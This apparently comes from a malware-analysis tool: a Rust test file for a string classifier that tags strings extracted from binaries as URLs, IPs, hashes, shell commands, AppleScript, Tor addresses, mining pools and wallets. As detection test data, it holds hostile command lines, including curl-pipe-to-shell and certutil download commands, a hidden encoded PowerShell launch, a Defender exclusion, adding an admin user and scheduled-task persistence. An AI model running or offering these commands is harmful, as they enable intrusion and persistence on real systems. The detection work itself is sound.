use super::classify_string;
use super::code::is_shell_command;
use super::encoding::is_cryptographic_hash;
use super::network::is_ipv4;
use crate::extraction::{extract_from_structures, find_string_structures};
use crate::types::{BinaryInfo, StringKind, StringStruct};

#[test]
fn jwts_classify_and_lookalikes_do_not() {
    // RFC 7519's example, and an RS256 token with a longer signature.
    for jwt in [
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL2V4YW1wbGUuYXV0aDAuY29tLyIsInN1YiI6ImF1dGgwfDEyMzQ1Njc4OTAiLCJhdWQiOiJodHRwczovL2FwaS5leGFtcGxlLmNvbS8iLCJleHAiOjE2NDE2NzgwMDB9.abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    ] {
        assert_eq!(classify_string(jwt), Some(StringKind::Jwt), "{jwt}");
    }
    // No `eyJ` header (a Go symbol's shape), two parts, too short, an
    // empty segment.
    for not_jwt in [
        "foo.bar.baz0123456789abcdef0123456789abcdef01234567890AB",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0",
        "eyJx.eyJx.eyJx",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    ] {
        assert_ne!(classify_string(not_jwt), Some(StringKind::Jwt), "{not_jwt}");
    }
}

#[test]
fn finds_64bit_le_string_header() {
    let info = BinaryInfo::from_elf(true, true);

    // Create test data with a string structure
    // ptr = 0x1000, len = 5
    let mut section_data = vec![0u8; 32];
    section_data[0..8].copy_from_slice(&0x1000u64.to_le_bytes());
    section_data[8..16].copy_from_slice(&5u64.to_le_bytes());

    let structs = find_string_structures(
        &section_data,
        0x2000, // section_addr
        0x1000, // blob_addr
        0x100,  // blob_size
        &info,
    );

    assert_eq!(structs.len(), 1);
    assert_eq!(structs[0].ptr, 0x1000);
    assert_eq!(structs[0].len, 5);
}

#[test]
fn reads_strings_at_struct_pointers() {
    let blob = b"HelloWorld";
    let structs = vec![
        StringStruct {
            struct_offset: 0,
            ptr: 0x1000,
            len: 5,
        },
        StringStruct {
            struct_offset: 16,
            ptr: 0x1005,
            len: 5,
        },
    ];

    let strings = extract_from_structures(blob, 0x1000, &structs, |_| None);

    assert_eq!(strings.len(), 2);
    assert_eq!(strings[0].value, "Hello");
    assert_eq!(strings[1].value, "World");
}

#[test]
fn classifies_env_var_names() {
    // Should be classified as EnvVar
    assert_eq!(classify_string("COLUMNS"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("TERM"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("CLICOLOR"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("LSCOLORS"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("COLORTERM"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("LS_SAMESORT"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("CLICOLOR_FORCE"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("PATH"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("HOME"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("USER"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("LC_ALL"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("XDG_CONFIG_HOME"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GO111MODULE"), Some(StringKind::EnvVar));

    // Go runtime env vars (no underscore, but start with GO)
    assert_eq!(classify_string("GODEBUG"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GOTRACEBACK"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GOMAXPROCS"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GOMEMLIMIT"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("GOMEMLIMIT="), Some(StringKind::EnvVar));

    // Whitelisted well-known vars
    assert_eq!(classify_string("GLIBC_TUNABLES"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("LD_PRELOAD"), Some(StringKind::EnvVar));
    assert_eq!(
        classify_string("DYLD_INSERT_LIBRARIES"),
        Some(StringKind::EnvVar)
    );
    assert_eq!(classify_string("JAVA_HOME"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("HTTP_PROXY"), Some(StringKind::EnvVar));

    // Should NOT be classified as EnvVar (not in whitelist, no underscore)
    assert_ne!(classify_string("THE"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("FOR"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("AND"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("DATA"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("OBJECT"), Some(StringKind::EnvVar));
    assert_ne!(classify_string("CLASS"), Some(StringKind::EnvVar));

    // With underscore, 3+ chars is OK
    assert_eq!(classify_string("A_B"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("BUILD_ID"), Some(StringKind::EnvVar));
    assert_eq!(classify_string("CI_JOB"), Some(StringKind::EnvVar));
}

#[test]
fn classifies_urls() {
    assert_eq!(
        classify_string("https://example.com"),
        Some(StringKind::Url)
    );
    assert_eq!(
        classify_string("http://localhost:8080"),
        Some(StringKind::Url)
    );
    assert_eq!(
        classify_string("postgresql://user:pass@host/db"),
        Some(StringKind::Url)
    );
}

#[test]
fn classifies_paths_but_not_go_metrics() {
    assert_eq!(classify_string("/usr/bin/ls"), Some(StringKind::Path));
    assert_eq!(classify_string("./config.yaml"), Some(StringKind::Path));
    assert_eq!(classify_string("../parent/file"), Some(StringKind::Path));

    // Go runtime metrics should NOT be classified as paths
    assert_eq!(classify_string("/gc/heap/allocs:bytes"), None);
    assert_eq!(classify_string("/sched/latencies:seconds"), None);
    assert_eq!(classify_string("/memory/classes/total:bytes"), None);
    assert_eq!(
        classify_string("/cpu/classes/gc/mark/assist:cpu-seconds"),
        None
    );
}

// Note: Section detection is now done via goblin address matching,
// not pattern matching in classify_string. See lib.rs extract_raw_strings.

#[test]
fn finds_32bit_string_header() {
    let info = BinaryInfo::from_elf(false, true);

    // Create 32-bit structure: ptr = 0x1000, len = 5
    let mut section_data = vec![0u8; 16];
    section_data[0..4].copy_from_slice(&0x1000u32.to_le_bytes());
    section_data[4..8].copy_from_slice(&5u32.to_le_bytes());

    let structs = find_string_structures(&section_data, 0x2000, 0x1000, 0x100, &info);

    assert_eq!(structs.len(), 1);
    assert_eq!(structs[0].ptr, 0x1000);
    assert_eq!(structs[0].len, 5);
}

#[test]
fn finds_big_endian_string_header() {
    let info = BinaryInfo::from_elf(true, false);

    // Create big-endian structure
    let mut section_data = vec![0u8; 32];
    section_data[0..8].copy_from_slice(&0x1000u64.to_be_bytes());
    section_data[8..16].copy_from_slice(&5u64.to_be_bytes());

    let structs = find_string_structures(&section_data, 0x2000, 0x1000, 0x100, &info);

    assert_eq!(structs.len(), 1);
    assert_eq!(structs[0].ptr, 0x1000);
    assert_eq!(structs[0].len, 5);
}

#[test]
fn rejects_header_pointing_outside_blob() {
    let info = BinaryInfo::from_elf(true, true);

    // Create structure pointing outside blob range
    let mut section_data = vec![0u8; 32];
    section_data[0..8].copy_from_slice(&0x5000u64.to_le_bytes()); // Outside blob
    section_data[8..16].copy_from_slice(&5u64.to_le_bytes());

    let structs = find_string_structures(
        &section_data,
        0x2000,
        0x1000, // blob starts at 0x1000
        0x100,  // blob is 0x100 bytes
        &info,
    );

    // Should find nothing since pointer is out of range
    assert!(structs.is_empty());
}

#[test]
fn rejects_header_longer_than_1mb() {
    let info = BinaryInfo::from_elf(true, true);

    // Create structure with very long length
    let mut section_data = vec![0u8; 32];
    section_data[0..8].copy_from_slice(&0x1000u64.to_le_bytes());
    section_data[8..16].copy_from_slice(&0x200000u64.to_le_bytes()); // > 1MB

    let structs = find_string_structures(&section_data, 0x2000, 0x1000, 0x100, &info);

    // Should reject strings > 1MB
    assert!(structs.is_empty());
}

#[test]
fn rejects_zero_length_header() {
    let info = BinaryInfo::from_elf(true, true);

    // Create structure with zero length
    let mut section_data = vec![0u8; 32];
    section_data[0..8].copy_from_slice(&0x1000u64.to_le_bytes());
    section_data[8..16].copy_from_slice(&0u64.to_le_bytes());

    let structs = find_string_structures(&section_data, 0x2000, 0x1000, 0x100, &info);

    // Should reject zero-length strings
    assert!(structs.is_empty());
}

#[test]
fn accepts_routable_ipv4() {
    // Real IP addresses should be detected
    assert!(is_ipv4("168.235.103.57"));
    assert!(is_ipv4("192.168.1.1"));
    assert!(is_ipv4("10.0.0.1"));
    assert!(is_ipv4("8.8.8.8"));
    assert!(is_ipv4("1.2.3.4"));
    assert!(is_ipv4("255.255.255.255"));
}

#[test]
fn rejects_version_numbers_as_ipv4() {
    // Assembly/software version patterns should NOT be detected as IPs
    // Pattern: X.0.0.0
    assert!(!is_ipv4("1.0.0.0"));
    assert!(!is_ipv4("4.0.0.0"));
    assert!(!is_ipv4("11.0.0.0"));
    assert!(!is_ipv4("255.0.0.0"));

    // Pattern: X.Y.0.0
    assert!(!is_ipv4("2.1.0.0"));
    assert!(!is_ipv4("4.5.0.0"));
    assert!(!is_ipv4("10.2.0.0"));

    // Pattern: two zero octets (e.g. ProductVersion string like 18.0.0.23)
    assert!(!is_ipv4("18.0.0.23"));
    assert!(!is_ipv4("6.0.0.1"));
    assert!(!is_ipv4("100.0.52.0"));
}

#[test]
fn rejects_unspecified_and_loopback_ipv4() {
    // 0.0.0.0 is not a useful IOC
    assert!(!is_ipv4("0.0.0.0"));

    // Localhost is rarely an IOC
    assert!(!is_ipv4("127.0.0.1"));
    assert!(!is_ipv4("127.0.0.2"));
    assert!(!is_ipv4("127.255.255.255"));
}

#[test]
fn rejects_malformed_ipv4() {
    // Not valid IP formats
    assert!(!is_ipv4(""));
    assert!(!is_ipv4("1.2.3"));
    assert!(!is_ipv4("1.2.3.4.5"));
    assert!(!is_ipv4("256.1.1.1"));
    assert!(!is_ipv4("1.2.3.abc"));
    assert!(!is_ipv4("hello"));
}

#[test]
fn detects_shell_commands() {
    // Should detect shell commands
    assert!(is_shell_command("ls -la | grep foo"));
    assert!(is_shell_command("cat file 2>/dev/null"));
    assert!(is_shell_command("echo test && rm -rf /tmp"));
    assert!(is_shell_command("curl http://example.com"));
    assert!(is_shell_command("wget http://example.com"));
    assert!(is_shell_command("/bin/bash -c 'echo test'"));
    assert!(is_shell_command("$(whoami)"));
}

#[test]
fn rejects_dotnet_generic_arity_as_shell() {
    // .NET generic types should NOT be detected as shell commands
    assert!(!is_shell_command("IEnumerable`1"));
    assert!(!is_shell_command("Dictionary`2"));
    assert!(!is_shell_command("List`1"));
    assert!(!is_shell_command("Func`3"));
    assert!(!is_shell_command("Action`1"));
    assert!(!is_shell_command("System.Collections.Generic.List`1"));
}

#[test]
fn backtick_needs_command_inside() {
    // Backtick must have command-like content with spaces
    assert!(is_shell_command("`ls -la`"));
    assert!(is_shell_command("echo `whoami foo`"));

    // Single backtick or empty content should not match
    assert!(!is_shell_command("foo`bar"));
    assert!(!is_shell_command("test`"));
}

#[test]
fn classifies_ip_but_not_version() {
    // Real IPs should be classified as IP
    assert_eq!(classify_string("168.235.103.57"), Some(StringKind::Ip));
    assert_eq!(classify_string("192.168.1.100"), Some(StringKind::Ip));

    // Version numbers should NOT be classified as IP
    assert_ne!(classify_string("1.0.0.0"), Some(StringKind::Ip));
    assert_ne!(classify_string("4.0.0.0"), Some(StringKind::Ip));
    assert_ne!(classify_string("2.1.0.0"), Some(StringKind::Ip));
}

#[test]
fn classifies_ipv6_but_not_colon_noise() {
    // Real IPv6 addresses carry a multi-digit hextet. classify_ip is only
    // reached for digit-leading strings (see the guard in classify_string),
    // so exercise digit-leading addresses here.
    assert_eq!(classify_string("2001:db8::1"), Some(StringKind::Ip));
    assert_eq!(classify_string("2606:4700::1111"), Some(StringKind::Ip));

    // Single-digit-only colon noise (e.g. ImageMagick.Q16.msixbundle) is
    // not a credible IPv6 IOC and must not be classified as IP
    assert_ne!(classify_string("0::c"), Some(StringKind::Ip));
    assert_ne!(classify_string("4::e"), Some(StringKind::Ip));
}

#[test]
fn classifies_shell_commands_and_shell_shebangs() {
    // Shell commands should be classified
    assert_eq!(
        classify_string("curl http://evil.com"),
        Some(StringKind::ShellCmd)
    );
    assert_eq!(
        classify_string("cat /etc/passwd | grep root"),
        Some(StringKind::ShellCmd)
    );

    // .NET generics should NOT be classified as shell commands
    assert_ne!(classify_string("IEnumerable`1"), Some(StringKind::ShellCmd));
    assert_ne!(classify_string("Dictionary`2"), Some(StringKind::ShellCmd));

    // Go runtime strings should NOT be classified as shell commands
    assert_ne!(
        classify_string("s.allocCount != s.nelems && freeIndex == s.nelems"),
        Some(StringKind::ShellCmd)
    );
    assert_ne!(
        classify_string("malformed GOMEMLIMIT; see `go doc runtime/debug.SetMemoryLimit`"),
        Some(StringKind::ShellCmd)
    );
    assert_ne!(
        classify_string("exec format error"),
        Some(StringKind::ShellCmd)
    );

    // Non-shell shebangs should NOT be classified as shell commands
    assert_ne!(
        classify_string("#!/usr/bin/env ruby"),
        Some(StringKind::ShellCmd)
    );
    assert_ne!(
        classify_string("#!/usr/bin/env python3"),
        Some(StringKind::ShellCmd)
    );
    assert_ne!(
        classify_string("#!/usr/bin/env node"),
        Some(StringKind::ShellCmd)
    );
    assert_ne!(
        classify_string("#!/usr/bin/env perl"),
        Some(StringKind::ShellCmd)
    );

    // Shell shebangs should still be classified as shell commands
    assert_eq!(classify_string("#!/bin/bash"), Some(StringKind::ShellCmd));
    assert_eq!(classify_string("#!/bin/sh"), Some(StringKind::ShellCmd));
    assert_eq!(
        classify_string("#!/usr/bin/env bash"),
        Some(StringKind::ShellCmd)
    );
    assert_eq!(
        classify_string("#!/usr/bin/env sh"),
        Some(StringKind::ShellCmd)
    );
}

#[test]
fn classifies_applescript_but_not_passwd_or_shell() {
    // AppleScript code should be classified as AppleScript
    assert_eq!(
        classify_string("set desktopFolder to path to desktop folder"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("tell application \"Finder\""),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("every file of desktopFolder whose name extension is in"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("duplicate aFile to POSIX file \"/tmp/backup\""),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("path to documents folder"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(classify_string("end tell"), Some(StringKind::AppleScript));
    assert_eq!(
        classify_string("repeat with aFile in allFiles"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("do shell script \"ls -la\""),
        Some(StringKind::AppleScript)
    );

    // Additional AppleScript patterns from real malware
    assert_eq!(
        classify_string("play dialog \"macOS needs to access System"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("ile \"%s\" as alias) with replacing"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("set tf to POSIX file \"%s\" as ali"),
        Some(StringKind::AppleScript)
    );

    // Regular shell commands should NOT be AppleScript
    assert_ne!(
        classify_string("curl http://example.com"),
        Some(StringKind::AppleScript)
    );
    assert_ne!(
        classify_string("cat /etc/passwd"),
        Some(StringKind::AppleScript)
    );

    // Passwd entries should NOT be AppleScript (avoid "_assetcache" matching "set ")
    assert_ne!(
        classify_string("_assetcache:*:235:235:Asset Cache Service:/var/empty:/usr/bin/false"),
        Some(StringKind::AppleScript)
    );
    assert_ne!(
        classify_string("_mobileasset:*:253:253:MobileAsset User:/var/ma:/usr/bin/false"),
        Some(StringKind::AppleScript)
    );

    // AppleScript "set" must have proper context (variable assignment)
    assert_eq!(
        classify_string("set myVar to 10"),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("set desktopPath = \"/Users/test\""),
        Some(StringKind::AppleScript)
    );
}

#[test]
fn accepts_md5_sha1_sha256_sha512() {
    // MD5 hash (32 chars)
    assert!(is_cryptographic_hash("d41d8cd98f00b204e9800998ecf8427e"));

    // SHA1 hash (40 chars)
    assert!(is_cryptographic_hash(
        "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    ));

    // SHA256 hash (64 chars) - empty string hash
    assert!(is_cryptographic_hash(
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    ));

    // SHA512 hash (128 chars)
    assert!(is_cryptographic_hash(
        "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e"
    ));
}

#[test]
fn rejects_wrong_length_and_hex_text_as_hash() {
    // Too short
    assert!(!is_cryptographic_hash("d41d8cd98f00b204"));

    // Wrong length (not 32/40/64/128)
    assert!(!is_cryptographic_hash("d41d8cd98f00b204e9800998ecf8427e00"));

    // Hex-encoded ASCII text ("Hello World" repeated) - should NOT be hash
    // "Hello World" = 48656c6c6f20576f726c64
    assert!(!is_cryptographic_hash("48656c6c6f20576f726c6448656c6c6f"));

    // Not hex digits
    assert!(!is_cryptographic_hash("ghijklmnopqrstuvwxyz123456789012"));
}

#[test]
fn classifies_hashes_but_not_hex_text() {
    // SHA256 hash should be classified as Hash
    assert_eq!(
        classify_string("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        Some(StringKind::Hash)
    );

    // SHA1 hash should be classified as Hash
    assert_eq!(
        classify_string("da39a3ee5e6b4b0d3255bfef95601890afd80709"),
        Some(StringKind::Hash)
    );

    // MD5 hash should be classified as Hash
    assert_eq!(
        classify_string("d41d8cd98f00b204e9800998ecf8427e"),
        Some(StringKind::Hash)
    );

    // Hex-encoded text should NOT be classified as Hash
    assert_ne!(
        classify_string("48656c6c6f20576f726c6448656c6c6f"),
        Some(StringKind::Hash)
    );
}

#[test]
fn classifies_php_but_not_reloc_garbage() {
    // Real PHP code
    assert_eq!(
        classify_string("<?php echo 'hello'; ?>"),
        Some(StringKind::PhpCode)
    );

    // Short echo tag with valid content
    assert_eq!(
        classify_string("<?= $variable ?>"),
        Some(StringKind::PhpCode)
    );

    // .reloc section garbage starting with <?= must NOT trigger PHP detection
    assert_ne!(classify_string("<?=\">.>|>"), Some(StringKind::PhpCode));
}

#[test]
fn java_imports_are_not_python() {
    // Java/Kotlin/Android imports should NOT be classified as Python
    assert_ne!(
        classify_string("import android.os.Build;"),
        Some(StringKind::PythonCode)
    );
    assert_ne!(
        classify_string("import android.os.Build"),
        Some(StringKind::PythonCode)
    );
    assert_ne!(
        classify_string("package com.airbnb.lottie;"),
        Some(StringKind::PythonCode)
    );
    assert_ne!(
        classify_string("import java.util.List;"),
        Some(StringKind::PythonCode)
    );
}

#[test]
fn undecodable_base64_lookalikes_are_not_base64() {
    // `=` mid-string can never decode, padded or not.
    for s in [
        "Key=Value1234567",
        "aBc=dEf1aBc=dEf1",
        "DStart=DStart+TLen+1",
    ] {
        assert_ne!(classify_string(s), Some(StringKind::Base64), "{s}");
    }
}

#[test]
fn ipv6_needs_a_real_address() {
    for s in ["2001:db8::1", "2606:4700:4700::1111"] {
        assert_eq!(classify_string(s), Some(StringKind::Ip), "{s}");
    }
    // Times and MAC addresses are colon-separated hex too.
    for s in ["12:34:56", "09:59:59", "00:1a:2b:3c:4d:5e", "0::c"] {
        assert_ne!(classify_string(s), Some(StringKind::Ip), "{s}");
    }
}

#[test]
fn long_strings_get_the_short_path_vetoes() {
    let long = |head: &str| format!("{head}{}", "x".repeat(1100));
    assert_ne!(
        classify_string(&long("https://www.apple.com/appleca/")),
        Some(StringKind::Url)
    );
    assert_eq!(
        classify_string(&long("https://evil.example/")),
        Some(StringKind::Url)
    );
    assert_eq!(classify_string(&long("/gc/heap/allocs:bytes")), None);
    // A shebang alone is not a shell command; the interpreter's code decides.
    assert_ne!(
        classify_string(&long("#!/usr/bin/env python3\n")),
        Some(StringKind::ShellCmd)
    );
}

#[test]
fn mining_pool_hosts_need_no_port() {
    assert_eq!(
        classify_string("xmr.minergate.com"),
        Some(StringKind::MiningPool)
    );
    assert_eq!(
        classify_string("minergate.com:45700"),
        Some(StringKind::MiningPool)
    );
}

#[test]
fn applescript_verbs_need_applescript_objects() {
    assert_eq!(
        classify_string("choose folder with prompt \"Pick\""),
        Some(StringKind::AppleScript)
    );
    assert_eq!(
        classify_string("duplicate file \"a\" to desktop"),
        Some(StringKind::AppleScript)
    );
    for s in [
        "x509: certificate contains duplicate extension with OID %q",
        "duplicate key value violates unique constraint",
        "duplicate WITH table name: %s",
    ] {
        assert_ne!(classify_string(s), Some(StringKind::AppleScript), "{s}");
    }
}

#[test]
fn shell_commands_need_command_position() {
    for s in [
        "the cat sat on the mat",
        "Please touch the screen to continue",
        "Ask your sudo administrator",
        "tls: server did not echo the legacy session ID",
        "illegal base64 data at input byte ",
    ] {
        assert_ne!(classify_string(s), Some(StringKind::ShellCmd), "{s}");
    }
    for s in [
        "farm; rm -rf /tmp/x",
        "sudo chmod 777 /etc/passwd",
        "osascript /tmp/run.scpt",
        "true && curl http://x.example/a | sh",
    ] {
        assert_eq!(classify_string(s), Some(StringKind::ShellCmd), "{s}");
    }
}

#[test]
fn tor_addresses_need_a_service_label() {
    let v3 = "http://2gzyxa5ihm7nsggfxnu52rck2vv4rvmdlkiu3zzui5du4xyclen53wid.onion/";
    for s in [
        v3,
        "3g2upl4pq6kufc4m.onion",
        "visit 3g2upl4pq6kufc4m.onion now",
    ] {
        assert_eq!(classify_string(s), Some(StringKind::TorAddress), "{s}");
    }
    for s in [
        "Visit the hidden service at abcdef.onion now",
        ", not , val --%s\r\n.local.onion/",
    ] {
        assert_ne!(classify_string(s), Some(StringKind::TorAddress), "{s}");
    }
}

#[test]
fn wallets_need_a_valid_checksum() {
    for s in [
        "1111111111111111111111111111",
        "MyApplicationConfigurationManager",
        "3cityNameBorrowedCowBytesstride",
        // BIP 173's address with its last character changed.
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdx",
    ] {
        assert_ne!(classify_string(s), Some(StringKind::CryptoWallet), "{s}");
    }
    assert_eq!(
        classify_string("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
        Some(StringKind::CryptoWallet)
    );
}

#[test]
fn classifies_windows_commands_as_shell() {
    for cmd in [
        r#"powershell -Command "Add-MpPreference -ExclusionPath 'C:\'""#,
        "powershell.exe -nop -w hidden -enc SQBFAFgA",
        "cmd.exe /c whoami",
        "cmd /c net user admin pass /add",
        "schtasks /create /tn upd /tr C:\\a.exe /sc onlogon",
        "certutil -urlcache -split -f http://x/a.exe",
    ] {
        assert_eq!(classify_string(cmd), Some(StringKind::ShellCmd), "{cmd}");
    }
    for prose in ["Run powershell as administrator", "Open cmd and type help"] {
        assert_ne!(
            classify_string(prose),
            Some(StringKind::ShellCmd),
            "{prose}"
        );
    }
}
